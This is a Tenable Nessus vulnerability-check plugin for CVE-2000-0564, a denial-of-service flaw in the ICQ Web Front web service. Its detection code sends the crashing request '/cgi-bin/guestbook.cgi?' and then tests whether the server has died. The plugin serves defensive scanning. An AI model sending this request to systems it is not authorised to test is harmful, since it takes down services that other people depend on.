#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10347);
 script_version ("$Revision: 1.21 $");
 script_cve_id("CVE-2000-0564");
 script_bugtraq_id(1463);
 
 script_name(english:"ICQ Web Front Service guestbook.cgi DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote host is prone to a denial of service attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server appears to be the ICQ Web Front service for ICQ.

An unauthenticated attacker can crash the version of ICQ Web Front 
installed on the remote host by connecting to it and sending a 
special request, '/cgi-bin/guestbook.cgi?'." );
 script_set_attribute(attribute:"see_also", value:
"http://archives.neohapsis.com/archives/ntbugtraq/2000-q2/0218.html" );
 script_set_attribute(attribute:"solution", value:
"Deactivate ICQ Web Front's web server service." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:H/Au:N/C:N/I:N/A:C" );
script_end_attributes();

 script_summary(english:"ICQ denial of service");
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_require_ports(80, "Services/www");
 script_dependencies("http_version.nasl");
 script_require_keys("Settings/ParanoidReport");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80, embedded: 1);


if (http_is_dead(port:port)) exit(0);
r = http_send_recv3(port: port, item: "/cgi-bin/guestbook.cgi?", method: "GET");
if (http_is_dead(port:port, retry: 3)) security_warning(port);
